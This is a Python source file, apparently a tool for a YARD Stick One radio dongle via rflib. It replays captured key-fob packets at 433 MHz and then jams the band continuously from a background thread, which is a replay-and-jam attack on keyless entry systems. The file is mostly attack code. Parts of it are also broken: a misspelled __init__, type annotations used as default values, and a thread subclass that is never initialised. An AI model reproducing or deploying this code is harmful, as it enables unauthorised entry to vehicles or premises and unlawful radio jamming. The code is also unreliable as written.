import threading
from time import sleep
from typing import Callable, List
from rflib import *
from keyfob import KeyFobPacket


class YdSendingEvent(threading.Event):
    """
    Event to synchronize receiver and sender threads \n
    --- \n
    Attributes: \n
    status: False (not sending), True (sending) \n
    --- \n
    methods: \n
    set_sending: sets sending event \n
    unset_sending: stops sending event in 1.5s \n
    """

    def __init__(self) -> None:
        threading.Event.__init__(self)

    def set_sending(self) -> None:
        """
        set sending event \n
        """
        self.set()

    def unset_sending(self) -> None:
        """
        unset sending event in 1.5 secs \n
        """
        new_thread = threading.Thread(target=self.__unset_sending_in_15, args=())
        new_thread.start()

    def __unset_sending_in_15(self) -> None:
        sleep(1.5)
        self.clear()


class YdJammingEvent(threading.Event):
    """
    Event to synchronize jamming and sender threads
    """

    def __int__(self) -> None:
        threading.Event.__init__(self)

    def set_jamming(self) -> None:
        """
        set jamming event
        """
        self.set()

    def unset_jamming(self) -> None:
        """
        unset jamming event
        """
        self.clear()


class YdStickConfig:
    """
    class to hold yd_stick configs
    """

    def __init__(self, mod_type: MOD_ASK_OOK, freq_hz: 433000000, channel: 1, sync_mode: 0, baud_rate: 2500):
        """
        :param mod_type: modulation type for signal
        :param freq_hz: frequency in hz
        :param channel: channel for yd_stick
        :param sync_mode: defaults to 0
        :param baud_rate: information rate
        :return: None
        """
        self.mod_type = mod_type
        self.freq_hz = freq_hz
        self.channel = channel
        self.sync_mode = sync_mode
        self.baud_rate = baud_rate


class YdJammingThread(threading.Thread):
    """
    yard stick jamming thread
    """

    def __init__(self, id_: str, jam_ev: YdJammingEvent, fn: Callable) -> None:
        """
        :param id_: name of thread
        :param jam_ev: event which controls opening and closing of thread
        """
        self.name = id_
        if not isinstance(jam_ev, YdJammingEvent):
            raise TypeError("jam_ev is not an instance of YdJammingEvent")
        self.jam_ev = jam_ev
        self.fn = fn

    def run(self) -> None:
        while self.jam_ev.is_set():
            self.fn()

    def stop(self) -> None:
        """
        stop the thread
        :return: None
        """
        self.jam_ev.unset_jamming()


class RfKeyFob:
    """
    create an instance of rf message
    """

    def __init__(self, cfg: YdStickConfig, kfb_list: List[KeyFobPacket], fn: Callable) -> None:
        """
        create rf message \n
        :param kfb_list: list of key fobs to be sent
        :param fn: the dev fn to be called during sending
        """

        self.cfg = cfg
        self.kfb_list = kfb_list
        self.fn = fn

    def __create_dispatchable_kfbs(self) -> List[str]:
        """
        create a dispatchable rf message
        :return: returns [kfb1, kfb2, kfb3, ...]

        """
        kfb_byte_list = []
        for kfb in self.kfb_list:
            kfb.convert_to_hex()
            packed_msg = bytes.fromhex(kfb.conc_pkts())
            kfb_byte_list.append(packed_msg)

        return kfb_byte_list

    def send(self) -> None:
        """
        sends key fob using the yardstick
        """
        kfb_byte_arr = self.__create_dispatchable_kfbs()
        self.fn(self.cfg, kfb_byte_arr)


class YdStick:
    """
    class for handling yard stick one gadget
    """

    def __init__(self, init=True) -> None:
        """
        :param init: default True, if set to false, yd_stick will not be initialized
        """
        self.yd_stick = RfCat() if init else None
        self.yd_jam_thread = None

    def __update_yd_stick_cfg(self, cfg: YdStickConfig) -> None:
        """
        :param cfg: instance of YdStickConfig
        :return: None
        """

        if self.yd_stick:
            self.yd_stick.setModeIDLE()
            self.yd_stick.setMdmModulation(cfg.mod_type)
            self.yd_stick.setFreq(cfg.freq_hz)
            self.yd_stick.setChannel(cfg.channel)
            self.yd_stick.setMdmSyncMode(cfg.sync_mode)
            self.yd_stick.setMdmDRate(cfg.baud_rate)
            self.yd_stick.setModeTX()

    def __send_kfbs(self, cfg: YdStickConfig, kfb_byte_list: List[str]) -> None:
        """
        Send a message using the rf device \n
        :param cfg: yd_stick configs
        :param kfb_byte_list: [kfb1, kfb2, kfb3, ...]
        """

        self.__update_yd_stick_cfg(cfg)

        if self.yd_stick:
            for kfb in kfb_byte_list:
                try:
                    self.yd_stick.setModeTX()
                    self.yd_stick.RFxmit(kfb, repeat=5)
                    self.yd_stick.setModeIDLE()
                except:
                    # TODO: add better logging, better catch clause
                    print("Error in sending message!")
                    self.begin_jamming()
                    return

        print(f"number of kfb sent - {len(kfb_byte_list)}")
        self.begin_jamming()

    def __jam_fn(self):
        """
        the jamming function that will run in a loop in jamming thread
        :return: None
        """
        jam_msg_hex = "74727920746F2062656174206279206A616D6D696E67"
        jam_msg_bytes = bytes.fromhex(jam_msg_hex)

        if self.yd_stick:
            self.yd_stick.RFxmit(jam_msg_bytes)
        else:
            sleep(0.1)  # since no yd_stick, emulate sending by sleeping

    def begin_jamming(self) -> None:
        """
        start jamming using the yard stick
        :return: None
        """
        jam_cfg = YdStickConfig()
        self.__update_yd_stick_cfg(jam_cfg)
        jam_ev = YdJammingEvent()
        jam_ev.set_jamming()
        self.yd_jam_thread = YdJammingThread('jam_th', jam_ev, self.__jam_fn)
        self.yd_jam_thread.start()

    def stop_jamming(self) -> None:
        """
        stop jamming using the yard stick
        :return: None
        """
        self.yd_jam_thread.stop()
        self.yd_jam_thread.join()
        sleep(0.1)
        self.yd_jam_thread = None

    def create_rf_kfbs(self, cfg: YdStickConfig, kfb_list: List[KeyFobPacket]) -> RfKeyFob:
        """
        :param cfg: yd_stick config for message
        :param kfb_list: list of key fobs to be sent
        :return: None
        """

        if not isinstance(cfg, YdStickConfig):
            raise TypeError("cfg is not instance of YdStickConfig")

        if not isinstance(kfb_list[0], KeyFobPacket):
            raise TypeError("msg is not an instance of KeyFobPacket")

        return RfKeyFob(cfg, kfb_list, self.__send_kfbs)